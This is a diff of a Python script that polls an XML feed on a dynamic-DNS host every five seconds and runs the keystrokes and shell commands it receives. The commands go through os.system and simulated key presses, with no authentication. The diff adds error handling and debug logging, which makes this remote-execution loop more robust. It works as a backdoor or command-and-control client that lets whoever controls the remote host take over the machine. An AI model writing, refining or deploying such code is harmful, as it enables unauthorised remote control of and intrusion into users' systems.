@@ -5,10 +5,16 @@ import os
 import keyboard as kb
 
 def extract_content(xml_string, tag_name):
-    root = ET.fromstring(xml_string)
-    content = root.find(tag_name).text
-    return content
-
+    try:
+        root = ET.fromstring(xml_string)
+        element = root.find(tag_name)
+        if element is not None and element.text is not None:
+            return element.text
+        else:
+            return ""  # Return an empty string if tag is empty or missing
+    except ET.ParseError as e:
+        print(f"Error parsing XML: {e}")
+        return None
 
 def get_xml_content(url):
     try:
@@ -16,38 +22,52 @@ def get_xml_content(url):
         if response.status_code == 200:
             return response.text
         else:
-            return f"Error: Unable to fetch the XML file. Status code: {response.status_code}"
+            print(f"Error: Unable to fetch the XML file. Status code: {response.status_code}")
+            return None
     except requests.exceptions.RequestException as e:
-        return f"Error: {e}"
-
+        print(f"Error: {e}")
+        return None
 
 url = 'http://corveric.ddns.net:5000/xml' 
 old_id = 99999999
+
 while True:
     try:
         xml_content = get_xml_content(url)
-    except:
-        pass
+        if xml_content is None or xml_content.strip() == "":
+            print("No valid XML content received, skipping iteration.")
+            time.sleep(5)
+            continue  # Skip to the next iteration if there's no valid XML
+        
+        print("Fetched XML:", xml_content)  # Debug print of the XML content
 
-    upd = extract_content(xml_content, "update")
-    ide = extract_content(xml_content, "id")
-    if not ide == old_id:
-        old_id = ide
-        try:
-            keys = extract_content(xml_content, "keys").split("*")
-        except:
-            keys = []
-        try:
-            cmds = extract_content(xml_content, "cmd").split("*")
-        except:
-            cmds = []
+        upd = extract_content(xml_content, "update")
+        ide = extract_content(xml_content, "id")
 
-        for key in keys:
-            kb.press_and_release(key)
-            time.sleep(0.2)
+        if upd is None or ide is None:
+            print("Error extracting content from XML, skipping iteration.")
+            time.sleep(5)
+            continue
 
-        for cmd in cmds:
-            os.system(cmd)
-            time.sleep(0.2)
+        if ide != old_id:  # If ID has changed, process the keys and commands
+            old_id = ide
+
+            keys = extract_content(xml_content, "keys").split("*") if extract_content(xml_content, "keys") else []
+            cmds = extract_content(xml_content, "cmd").split("*") if extract_content(xml_content, "cmd") else []
+
+            for key in keys:
+                if key.strip():
+                    print(f"Pressing key: {key}")
+                    kb.press_and_release(key)
+                    time.sleep(0.2)
+
+            for cmd in cmds:
+                if cmd.strip():
+                    print(f"Executing command: {cmd}")
+                    os.system(cmd)
+                    time.sleep(0.2)
+
+    except Exception as e:
+        print(f"Unexpected error: {e}")
 
     time.sleep(5)
